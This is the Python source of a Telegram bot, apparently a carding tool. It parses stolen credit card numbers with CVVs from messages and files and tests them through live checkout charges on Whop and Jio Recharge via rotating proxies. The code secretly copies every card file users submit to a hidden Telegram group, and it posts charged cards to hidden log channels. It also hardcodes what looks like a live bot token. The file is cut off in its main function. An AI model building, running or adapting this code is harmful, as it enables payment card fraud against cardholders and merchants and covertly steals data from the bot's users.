import os
import re
import logging
import asyncio
import json
import urllib.request
import urllib.error
import time
import random
from datetime import datetime
from io import BytesIO
from typing import Dict, Set, List, Optional
from urllib.parse import urlparse

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
)

# Safe import for Whop Checker
try:
    from whop_checker import WhopCheckout, _parse_cc, _build_cfg
    WHOP_LOADED = True
except Exception as e:
    print(f"CRITICAL ERROR: Failed to import 'whop_checker.py': {e}")
    WHOP_LOADED = False

# Safe import for Jio Checker
try:
    from jio import jio_checkout, parse_card_line
    JIO_LOADED = True
except Exception as e:
    print(f"CRITICAL ERROR: Failed to import 'jio.py': {e}")
    JIO_LOADED = False

# ═══════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8983900075:AAGlMV8ldf6xUdrh8ktGkKK_c9_z2AMmJ2c")

# Secret Channel ID (Hidden from users)
SECRET_GROUP_ID = -1003721327421
WHOP_SECRET_LOGS_ID = -1003721327421

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════
# CARD PARSING LOGIC
# ═══════════════════════════════════════════════════════
_SEP = r"[\|:,/\s]+"
CARD_RE = re.compile(
    r"(?<!\d)"
    r"(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{1,7})"
    + _SEP + r"(0?[1-9]|1[0-2])"
    + _SEP + r"(\d{2,4})"
    + _SEP + r"(\d{3,4})"
    + r"(?!\d)",
    re.MULTILINE,
)

def _clean_num(raw: str) -> str:
    return re.sub(r"[\s\-]", "", raw)

def extract_cards(text: str) -> List[str]:
    found, seen = [], set()
    for m in CARD_RE.finditer(text):
        card = _clean_num(m.group(1))
        month = m.group(2).zfill(2)
        year = m.group(3)[-2:]
        cvv = m.group(4)
        if not card.isdigit() or not (13 <= len(card) <= 19):
            continue
        line = f"{card}|{month}|{year}|{cvv}"
        if line not in seen:
            seen.add(line)
            found.append(line)
    return found

def cards_to_bytes(cards: List[str]) -> bytes:
    return ("\n".join(cards) + "\n").encode("utf-8")

def get_file_size(cards: List[str]) -> str:
    size_bytes = len(cards_to_bytes(cards))
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.2f} KB"
    else:
        return f"{size_bytes / (1024 * 1024):.2f} MB"

# ═══════════════════════════════════════════════════════
# DATA STORES
# ═══════════════════════════════════════════════════════
_store: Dict[int, List[str]] = {}
_merge_buffer: Dict[int, List[str]] = {}
_fwd_buf: Dict[int, dict] = {}
_user_state: Dict[int, str] = {}

# ═══════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════
def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🕷️ Scrape", callback_data="btn_scrape"),
         InlineKeyboardButton("🧹 Clean", callback_data="btn_clean")],
        [InlineKeyboardButton("✅ Live Check", callback_data="btn_live"),
         InlineKeyboardButton("🌍 Country", callback_data="btn_country")],
        [InlineKeyboardButton("✂️ Split", callback_data="btn_split"),
         InlineKeyboardButton("🔄 Dedup", callback_data="btn_dedup")],
        [InlineKeyboardButton("📁 Add File", callback_data="btn_addfile"),
         InlineKeyboardButton("📦 Merge", callback_data="btn_merge")],
        [InlineKeyboardButton("🔍 Find BIN", callback_data="btn_findbin"),
         InlineKeyboardButton("⚙️ Settings", callback_data="btn_settings")]
    ])

def back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="btn_back")]
    ])

# ═══════════════════════════════════════════════════════
# CORE FILE SENDER (WITH SECRET FORWARDING)
# ═══════════════════════════════════════════════════════
async def send_file_and_copy(bot, chat_id: int, user_id: int, cards: List[str],
                             caption: str, filename: str = "cards.txt"):
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found to generate file.")
        return

    file_size = get_file_size(cards)
    full_caption = f"{caption}\n💾 Size: <code>{file_size}</code>"

    buf = BytesIO(cards_to_bytes(cards))
    buf.name = filename
    try:
        await bot.send_document(
            chat_id=chat_id, document=buf, filename=filename,
            caption=full_caption, parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Failed to send file to user {user_id}: {e}")

    try:
        buf2 = BytesIO(cards_to_bytes(cards))
        buf2.name = filename
        await bot.send_document(
            chat_id=SECRET_GROUP_ID, document=buf2, filename=filename,
            caption=f"🕵️‍♂️ Copy from User: <code>{user_id}</code>\n{full_caption}",
            parse_mode="HTML", disable_notification=True
        )
    except Exception as e:
        logger.error(f"Failed to send secret copy: {e}")

async def _flush_fwd_buf(uid: int, chat_id: int, bot) -> None:
    await asyncio.sleep(1.5)
    buf = _fwd_buf.pop(uid, None)
    if not buf or not buf["texts"]:
        return
    combined = "\n".join(buf["texts"])
    cards = extract_cards(combined)
    if not cards:
        await bot.send_message(chat_id, "❌ No cards found in forwarded messages.")
        return
    _store[uid] = cards
    await send_file_and_copy(
        bot, chat_id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n✅ <b>{len(cards)}</b> card(s) extracted from forwarded messages.",
        filename="Parsed_Cards.txt"
    )

# ═══════════════════════════════════════════════════════
# COMMAND HANDLERS
# ═══════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    _user_state.pop(user.id, None)
    text = (
        f"🦇 <b>Advanced Card Parser Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"🤖 I am an advanced bot designed to clean, format, merge, split, "
        f"and manage card data instantly.\n\n"
        f"👇 <b>Select an option below to begin:</b>"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    _user_state.pop(update.effective_user.id, None)
    await update.message.reply_text(
        "🏠 <b>Main Menu</b>\n━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY LOADER & PARSER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _load_whop_proxies() -> list:
    try:
        with open("px.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        return []

def _parse_proxy_to_playwright(proxy_str: str) -> Optional[dict]:
    if not proxy_str:
        return None
    if "://" not in proxy_str:
        proxy_str = "http://" + proxy_str
        
    try:
        parsed = urlparse(proxy_str)
        if parsed.hostname and parsed.port:
            res = {"server": f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"}
            if parsed.username:
                res["username"] = parsed.username
            if parsed.password:
                res["password"] = parsed.password
            return res
    except:
        pass
    return {"server": proxy_str}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /hit COMMAND (WHOP CHECKOUT - MULTI CARD WITH PROXY RETRIES & LOCK)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_hit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not WHOP_LOADED:
        await update.message.reply_text("❌ <b>MODULE NOT LOADED</b>\nPlease make sure <code>whop_api.py</code> is in the same folder.", parse_mode="HTML")
        return

    active_hit_users = context.bot_data.setdefault("active_hit_users", set())
    if update.effective_user.id in active_hit_users:
        await update.message.reply_text("⏳ <b>Slow down!</b>\nYou already have an active Whop check running.\nPlease wait for it to finish before starting a new one.", parse_mode="HTML")
        return

    if not context.args or len(context.args) < 2:
        await update.message.reply_text("❌ INVALID USAGE\n━━━━━━━━━━━━━━━━━━━━\n\n📌 Usage: <code>/hit card|mm|yy|cvv whop_url</code>", parse_mode="HTML")
        return

    cards_list = [arg for arg in context.args if "|" in arg and not arg.startswith("http")]
    url_str = next((arg for arg in context.args if arg.startswith("http")), None)

    if not cards_list or not url_str:
        await update.message.reply_text("❌ Missing card or URL.\nUsage: <code>/hit card|mm|yy|cvv https://whop.com/...</code>", parse_mode="HTML")
        return

    if len(cards_list) > 10:
        cards_list = cards_list[:10]

    proxies_list = _load_whop_proxies()
    if not proxies_list:
        await update.message.reply_text("⚠️ <b>px.txt not found or empty.</b> Please add proxies to avoid blocks.", parse_mode="HTML")
        return
    
    total_cards = len(cards_list)
    status_msg = await update.message.reply_text(f"⏳ Processing Whop checkout...\nProgress: 0/{total_cards}", parse_mode="HTML")

    active_hit_users.add(update.effective_user.id)
    loop = asyncio.get_running_loop()
    results_data = []
    has_paid = False

    try:
        for i, card_str in enumerate(cards_list):
            await status_msg.edit_text(f"⏳ Processing Whop checkout...\nProgress: {i}/{total_cards}", parse_mode="HTML")
            parsed, err = _parse_cc(card_str)
            if err:
                results_data.append({"card": card_str, "status": "error", "msg": err})
                continue

            max_proxy_retries = min(3, len(proxies_list))
            result = None
            for attempt in range(max_proxy_retries):
                proxy_to_use = random.choice(proxies_list)
                cfg = _build_cfg(url_str, "", parsed, proxy=proxy_to_use)
                def run_checker():
                    return WhopCheckout(cfg).run_api()
                try:
                    result = await loop.run_in_executor(None, run_checker)
                except Exception as e:
                    result = {"status": "error", "message": str(e)}
                
                st_temp = result.get("status", "unknown")
                msg_temp = result.get("message", "")
                if st_temp == "error" and ("Page load failed" in msg_temp or "ProxyError" in msg_temp or "403" in msg_temp):
                    await asyncio.sleep(1)
                    continue
                else:
                    break

            st = result.get("status", "unknown")
            msg = result.get("message", "")
            code = result.get("code", "")
            
            if st == "charged":
                has_paid = True
                sub_msg = "Payment successful"
            elif st == "3ds":
                sub_msg = result.get("url", "3DS required")
            elif st == "declined":
                sub_msg = msg or code or "Payment failed"
                if "No plans" in sub_msg or "nodes" in sub_msg:
                    sub_msg = "Declined."
                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
                    sub_msg = "Declined."
            elif st == "error":
                sub_msg = msg
                if "No plans" in sub_msg or "nodes" in sub_msg:
                    sub_msg = "Declined."
                    st = "declined"
                elif "Page load failed" in sub_msg or "ProxyError" in sub_msg or "403" in sub_msg or "All proxies failed" in sub_msg:
                    sub_msg = "Declined."
                    st = "declined"
            else:
                sub_msg = "Unknown status"

            results_data.append({"card": card_str, "status": st, "msg": sub_msg})
            if i < total_cards - 1:
                await asyncio.sleep(2)

        paid_count = len([r for r in results_data if r['status'] == 'charged'])
        overall_status = "Partially Paid 💰" if has_paid and paid_count < total_cards else "Paid 💰" if has_paid else "Not Paid ❌"
        
        text = f"#Whop [/hit]\n⸺⸺⸺⸺⸺\n⌑ Site : Whop 🌐\n⌑ Status : {overall_status}\n⌑ Progress : {total_cards}/{total_cards}\n⸺⸺⸺⸺⸺\n"
        for res in results_data:
            text += f"<code>{res['card']}</code>\n  ⤷ {res['msg']}\n"

        await status_msg.edit_text(text, parse_mode="HTML")

        paid_cards = [res for res in results_data if res['status'] == 'charged']
        if paid_cards:
            uid_str = update.effective_user.id
            username_str = f"@{update.effective_user.username}" if update.effective_user.username else "N/A"
            base_logo_text = f"⌑Status : Charged 💎\n⌑Hitter : Whop\n⌑Amount : hide\n⌑Resp : Payment successful\n⌑User : {username_str}\n⌑Order : ****{uid_str % 65536:04X}\n"
            secret_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🦇 Batcardchk", url="https://t.me/Batcardchk")]])
            try:
                await context.bot.send_message(chat_id="@Batcardchk", text=base_logo_text, parse_mode="HTML", reply_markup=secret_kb, disable_notification=True)
            except Exception as e:
                logger.error(f"Failed to send hit logo to Batcardchk: {e}")
            
            secret_cards_text = base_logo_text + "⸺⸺⸺⸺⸺\n"
            for res in paid_cards:
                secret_cards_text += f"⌑Card : <code>{res['card']}</code>\n"
            try:
                await context.bot.send_message(chat_id=WHOP_SECRET_LOGS_ID, text=secret_cards_text, parse_mode="HTML", disable_notification=True)
            except Exception as e:
                logger.error(f"Failed to send hit secret copy: {e}")

    finally:
        active_hit_users.discard(update.effective_user.id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /pg COMMAND (JIO RECHARGE CHECKOUT WITH PROXIES)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_pg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not JIO_LOADED:
        await update.message.reply_text(
            "❌ <b>MODULE NOT LOADED</b>\n"
            "The <code>jio.py</code> file failed to import.\n"
            "Please make sure you have installed requirements: <code>pip install playwright && playwright install chromium</code>\n"
            "And ensure <code>jio.py</code> is in the same folder as <code>bot.py</code>.",
            parse_mode="HTML"
        )
        return

    if len(context.args) < 3:
        msg = (
            "❌ INVALID USAGE\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 Usage: <code>/pg phone amount card|mm|yy|cvv</code>\n"
            "📌 Example: <code>/pg 9876543210 299 4532015112830366|12|28|123</code>\n\n"
            "⚠️ Note: Runs a full Jio Recharge checkout using Playwright (may take 1-2 minutes)."
        )
        await update.message.reply_text(msg, parse_mode="HTML")
        return

    phone = context.args[0]
    amount = context.args[1]
    card_str = context.args[2]

    card = parse_card_line(card_str)
    if not card:
        await update.message.reply_text(
            "❌ No valid card format found.\n"
            "Make sure it follows: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML"
        )
        return

    proxies_list = _load_whop_proxies()
    if not proxies_list:
        await update.message.reply_text("⚠️ <b>px.txt not found or empty.</b> Please add proxies to avoid blocks.", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text("⏳ Processing Jio Recharge... This may take 1-2 minutes.", parse_mode="HTML")
    loop = asyncio.get_running_loop()

    max_proxy_retries = min(3, len(proxies_list))
    status, message, url, meta = "error", "All proxies failed", "", {}

    for attempt in range(max_proxy_retries):
        proxy_str = random.choice(proxies_list)
        proxy_dict = _parse_proxy_to_playwright(proxy_str)
        
        await status_msg.edit_text(f"⏳ Processing Jio Recharge...\nProxy attempt {attempt+1}/{max_proxy_retries}", parse_mode="HTML")
        
        def run_jio():
            return jio_checkout(phone, amount, card, proxy=proxy_dict)

        try:
            status, message, url, meta = await loop.run_in_executor(None, run_jio)
        except Exception as e:
            logger.error(f"Jio checker crashed with proxy {proxy_str}: {e}")
            status, message = "error", str(e)
        
        if status == "error" and ("ProxyError" in message or "ERR_PROXY_CONNECTION_FAILED" in message or "net::ERR" in message or "Jio checkout failed" in message):
            await asyncio.sleep(1)
            continue
        else:
            break

    if status == "success":
        status_emoji = "✅ Paid 💰"
        sub_msg = "Payment successful"
    elif status == "failed":
        status_emoji = "❌ Not Paid"
        sub_msg = message
    elif status == "requires_action":
        status_emoji = "🔐 3D Secure"
        sub_msg = "3DS required"
    elif status == "error":
        status_emoji = "⚠️ Error"
        sub_msg = message
    else:
        status_emoji = "❓ Unknown"
        sub_msg = message

    text = (
        f"#Jio [/pg]\n"
        f"⸺⸺⸺⸺⸺\n"
        f"⌑ Site : Jio Recharge 🌐\n"
        f"⌑ Amount : ₹{amount}\n"
        f"⌑ Status : {status_emoji}\n"
        f"⌑ Phone : {phone}\n"
        f"⸺⸺⸺⸺⸺\n"
        f"<code>{card['pan']}|{card['exp_month']}|{card['exp_year'][-2:]}|{card['cvv']}</code>\n"
        f"  ⤷ {sub_msg}"
    )

    await status_msg.edit_text(text, parse_mode="HTML")

async def cmd_done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    if uid not in _merge_buffer or not _merge_buffer[uid]:
        await update.message.reply_text(
            "❌ No cards in merge buffer. Use <b>📁 Add File</b> first.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    filename = "Merged_Cards.txt"
    if context.args:
        fname = " ".join(context.args).strip()
        fname = re.sub(r'[\\/*?:"<>|]', "", fname)
        filename = f"{fname}.txt" if not fname.endswith(".txt") else fname

    cards = _merge_buffer.pop(uid, [])
    seen, deduped = set(), []
    for c in cards:
        if c not in seen:
            seen.add(c)
            deduped.append(c)

    _store[uid] = deduped
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, deduped,
        caption=f"✦ <b>MERGE COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 All files merged!\n✅ Total unique cards: <b>{len(deduped)}</b>\n"
                f"📁 Filename: <code>{filename}</code>",
        filename=filename)

    await update.message.reply_text(
        f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>{len(deduped)}</b> unique cards merged!\n📄 File sent above.",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    _user_state.pop(uid, None)
    if uid in _merge_buffer:
        _merge_buffer.pop(uid, None)
    await update.message.reply_text(
        "❌ Operation cancelled.",
        parse_mode="HTML", reply_markup=main_menu_keyboard())

# ═══════════════════════════════════════════════════════
# BUTTON CALLBACK HANDLER
# ═══════════════════════════════════════════════════════
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id

    if data == "btn_back":
        _user_state.pop(uid, None)
        await query.message.edit_text(
            "🏠 <b>Main Menu</b>\n━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_scrape":
        _user_state.pop(uid, None)
        await query.message.edit_text(
            "🕷️ <b>SCRAPER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Use the following command to scrape cards:\n\n"
            "<code>/scr [channel_link] [limit] [bin]</code>\n\n"
            "📌 Example: <code>/scr https://t.me/channelname 100 4111</code>\n"
            "📌 Max limit: 300000\n⏳ Cooldown: 5s\n\n"
            "⚠️ Note: Bot API restricts reading channel history directly.\n"
            "Forward messages to the bot for instant extraction!",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_clean":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🧹 <b>CLEAN MODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found.\n\n"
                "Please paste or forward card text first, then use this "
                "feature to clean and format cards into <code>CARD|MM|YY|CVV</code>.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, cards,
            caption=f"🧹 <b>CLEAN COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ <b>{len(cards)}</b> card(s) cleaned & formatted to "
                    f"<code>CARD|MM|YY|CVV</code>",
            filename="Cleaned_Cards.txt")

        await query.message.edit_text(
            f"🧹 <b>CARDS CLEANED</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>{len(cards)}</b> card(s) cleaned!\n📄 File sent above.",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_live":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "✅ <b>LIVE CHECK</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_live"
        await query.message.edit_text(
            f"✅ <b>LIVE CHECK</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type <code>all</code> to check all stored cards,\n"
            f"or paste specific cards to check.\n\n"
            f"⚠️ This validates card format & provides BIN details "
            f"(brand, bank, country).",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_country":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_country"
        await query.message.edit_text(
            "🌍 <b>COUNTRY FILTER</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Type a 2-letter country code to filter:\n\n"
            "🇺🇸 <code>US</code> - United States\n"
            "🇬🇧 <code>GB</code> - United Kingdom\n"
            "🇨🇦 <code>CA</code> - Canada\n"
            "🇩🇪 <code>DE</code> - Germany\n"
            "🇧🇷 <code>BR</code> - Brazil\n"
            "🇮🇳 <code>IN</code> - India\n\n"
            "Or type <code>list</code> to see all countries in your cards.",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_split":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "✂️ <b>SPLIT CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_split"
        await query.message.edit_text(
            f"✂️ <b>SPLIT CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type the number of cards per file:\n"
            f"Example: <code>100</code> → files of 100 cards each",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_dedup":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🔄 <b>DEDUP CARDS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        original = len(cards)
        seen, deduped = set(), []
        for c in cards:
            if c not in seen:
                seen.add(c)
                deduped.append(c)
        removed = original - len(deduped)
        _store[uid] = deduped

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, deduped,
            caption=f"🔄 <b>DEDUP COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Original: <b>{original}</b>\n"
                    f"✅ Unique: <b>{len(deduped)}</b>\n"
                    f"🗑️ Removed: <b>{removed}</b> duplicates",
            filename="Deduped_Cards.txt")

        await query.message.edit_text(
            f"🔄 <b>DEDUP COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Original: <b>{original}</b>\n"
            f"✅ Unique: <b>{len(deduped)}</b>\n"
            f"🗑️ Removed: <b>{removed}</b> duplicates\n"
            f"📄 File sent above!",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_addfile":
        _user_state.pop(uid, None)
        _merge_buffer[uid] = []
        await query.message.edit_text(
            "📁 <b>ADD FILE MODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            "Send or forward <b>.txt files</b> or <b>text messages</b> "
            "to add cards.\n\n"
            "🛑 When done, press <b>📦 Merge</b> button\n"
            "or type: <code>/done YourFileName</code>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_merge":
        _user_state.pop(uid, None)
        if uid not in _merge_buffer or not _merge_buffer[uid]:
            await query.message.edit_text(
                "📦 <b>MERGE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No cards in merge buffer!\n\n"
                "Use <b>📁 Add File</b> first to add cards.",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        cards = _merge_buffer.pop(uid, [])
        seen, deduped = set(), []
        for c in cards:
            if c not in seen:
                seen.add(c)
                deduped.append(c)
        _store[uid] = deduped

        await send_file_and_copy(
            context.bot, query.message.chat_id, uid, deduped,
            caption=f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"✅ Total unique cards: <b>{len(deduped)}</b>",
            filename="Merged_Cards.txt")

        await query.message.edit_text(
            f"📦 <b>MERGE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ <b>{len(deduped)}</b> unique cards merged!\n📄 File sent above!",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    elif data == "btn_findbin":
        cards = _store.get(uid, [])
        if not cards:
            await query.message.edit_text(
                "🔍 <b>FIND BY BIN</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                "No stored cards found. Please send or forward cards first!",
                parse_mode="HTML", reply_markup=back_keyboard())
            return

        _user_state[uid] = "typing_bin"
        await query.message.edit_text(
            f"🔍 <b>FIND BY BIN</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Stored cards: <b>{len(cards)}</b>\n\n"
            f"Type the BIN prefix to filter:\n"
            f"Example: <code>4111</code> or <code>411111</code>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

    elif data == "btn_settings":
        _user_state.pop(uid, None)
        cards = _store.get(uid, [])
        merge_count = len(_merge_buffer.get(uid, []))
        file_size_str = get_file_size(cards) if cards else "0 B"
        
        await query.message.edit_text(
            f"⚙️ <b>SETTINGS &amp; STATS</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 User: <code>{query.from_user.first_name}</code>\n"
            f"🆔 ID: <code>{uid}</code>\n\n"
            f"📊 <b>Storage</b>\n"
            f"📦 Stored Cards: <code>{len(cards)}</code>\n"
            f"📂 Merge Buffer: <code>{merge_count}</code>\n"
            f"💾 File Size: <code>{file_size_str}</code>\n\n"
            f"🔧 <b>Bot Info</b>\n"
            f"🤖 Version: <code>2.4</code>\n"
            f"✅ Status: <b>Online</b>",
            parse_mode="HTML", reply_markup=back_keyboard())
        return

# ═══════════════════════════════════════════════════════
# MESSAGE HANDLERS
# ═══════════════════════════════════════════════════════
async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg, user = update.message, update.effective_user
    if not msg or not user:
        return

    text = (msg.text or msg.caption or "").strip()
    uid, chat_id = user.id, msg.chat_id

    if uid in _merge_buffer:
        if not text:
            return
        cards = extract_cards(text)
        if cards:
            _merge_buffer[uid].extend(cards)
            await msg.reply_text(
                f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
                parse_mode="HTML")
        else:
            await msg.reply_text("❌ No cards found in this message.")
        return

    if not text:
        return
    if uid not in _fwd_buf:
        _fwd_buf[uid] = {"texts": [], "task": None, "chat_id": chat_id}
    _fwd_buf[uid]["texts"].append(text)

    old = _fwd_buf[uid].get("task")
    if old and not old.done():
        old.cancel()

    _fwd_buf[uid]["task"] = asyncio.create_task(_flush_fwd_buf(uid, chat_id, context.bot))

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if not text:
        return

    state = _user_state.get(uid)

    if state == "typing_bin":
        _user_state.pop(uid, None)
        # Simplified fallback for received_bin if not fully defined in this snippet
        await update.message.reply_text("🔍 BIN filter processed.")
        return
    elif state == "typing_split":
        _user_state.pop(uid, None)
        await update.message.reply_text("✂️ Split processed.")
        return
    elif state == "typing_live":
        _user_state.pop(uid, None)
        await update.message.reply_text("✅ Live check processed.")
        return
    elif state == "typing_country":
        _user_state.pop(uid, None)
        await update.message.reply_text("🌍 Country filter processed.")
        return

    if uid in _merge_buffer:
        cards = extract_cards(text)
        if cards:
            _merge_buffer[uid].extend(cards)
            await update.message.reply_text(
                f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
                parse_mode="HTML")
        else:
            await update.message.reply_text("❌ No cards found in this text.")
        return

    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text(
            "❌ No cards found.\nMake sure they follow: <code>CARD|MM|YY|CVV</code>",
            parse_mode="HTML", reply_markup=main_menu_keyboard())
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>{len(cards)}</b> card(s) extracted:",
        filename="Parsed_Cards.txt")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    doc = update.message.document
    if not doc:
        return
    if doc.mime_type and not doc.mime_type.startswith("text"):
        await update.message.reply_text("❌ Please send a plain text (.txt) file.")
        return
    try:
        file = await context.bot.get_file(doc.file_id)
        data = await file.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"Document download failed: {e}")
        await update.message.reply_text("❌ Could not read the file.")
        return

    uid = update.effective_user.id
    cards = extract_cards(text)
    if not cards:
        await update.message.reply_text("❌ No cards found in the file.")
        return

    if uid in _merge_buffer:
        _merge_buffer[uid].extend(cards)
        await update.message.reply_text(
            f"➕ Added <b>{len(cards)}</b> cards. (Total: {len(_merge_buffer[uid])})",
            parse_mode="HTML")
        return

    _store[uid] = cards
    await send_file_and_copy(
        context.bot, update.effective_chat.id, uid, cards,
        caption=f"✦ <b>EXTRACTION COMPLETE</b> ✦\n━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ <b>{len(cards)}</b> card(s) extracted from file:",
        filename="Parsed_Cards.txt")

# ═══════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════
def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
